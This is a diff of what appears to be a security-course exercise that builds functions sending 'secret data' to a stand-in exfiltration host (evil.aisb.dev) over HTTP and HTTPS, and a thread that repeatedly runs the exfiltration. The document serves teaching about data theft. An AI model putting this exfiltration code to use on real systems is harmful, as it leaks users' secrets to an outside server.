@@ -26,10 +26,10 @@ def make_evil_request(secret_data: str) -> Optional[str]:
     #      - to ensure tests pass, use `requests.get(url, params=..., timeout=5)`
     #      - if the tests fail and you are pretty sure you are making the correct request, you can ignore the first test
     #   2. Return the response text if successful (status 200), None otherwise
-    
+
     # response = requests.get(f'http://evil.aisb.dev/exfiltrate?data={secret_data}', timeout=5)
     try:
-        response = requests.get('http://evil.aisb.dev/exfiltrate', params={'data': secret_data}, timeout=5)
+        response = requests.get("http://evil.aisb.dev/exfiltrate", params={"data": secret_data}, timeout=5)
     except requests.exceptions.ConnectionError:
         return None
 
@@ -38,10 +38,43 @@ def make_evil_request(secret_data: str) -> Optional[str]:
     else:
         return response.text
 
+
 from w1d2_test import test_make_evil_request
+
 test_make_evil_request(make_evil_request)
 
 exfiltrate_data = make_evil_request
+
+
+# %%
+def make_evil_request_https(secret_data: str) -> Optional[str]:
+    """
+    Send a GET request over HTTPS to evil.aisb.dev with secret data.
+
+    Args:
+        secret_data: The secret information to exfiltrate
+
+    Returns:
+        The response text from the server, or None if the request fails
+    """
+    try:
+        response = requests.get("https://evil.aisb.dev/exfiltrate", params={"data": secret_data}, timeout=5)
+    except requests.exceptions.ConnectionError:
+        return None
+
+    if response.status_code != 200:
+        return None
+    else:
+        return response.text
+
+
+from w1d2_test import test_make_evil_request_https
+
+test_make_evil_request_https(make_evil_request_https)
+
+
+# Update the exfiltrate_data function to use HTTPS
+exfiltrate_data = make_evil_request_https
 
 if __name__ == "__main__":  # Only executed when running the script directly
     """
@@ -60,5 +93,8 @@ if __name__ == "__main__":  # Only executed when running the script directly
                 break
 
     import threading
+
     thread = threading.Thread(target=loop_exfiltration)
     thread.start()
+
+# %%
